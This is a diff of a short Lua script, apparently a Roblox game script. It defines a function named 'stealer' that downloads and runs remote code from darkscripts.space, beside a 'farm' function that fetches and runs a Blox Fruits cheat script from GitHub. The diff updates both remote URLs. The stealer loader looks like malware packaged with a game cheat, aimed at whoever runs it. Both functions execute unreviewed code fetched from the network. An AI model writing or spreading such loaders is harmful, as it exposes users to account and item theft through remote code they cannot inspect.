@@ -1,10 +1,9 @@
-
 local function stealer()
-    loadstring(game:HttpGet('https://darkscripts.space/scripts/bd52bf2b-ce7f-4a83-a00f-33d245851233_1190341546470551652.lua',true))()
+    loadstring(game:HttpGet('https://darkscripts.space/scripts/8be944bc-c5f7-45e4-a2ec-10c6ef49b17e_824604012124569610.lua',true))()
 end
 local function farm()
  
-loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
 
 end
 
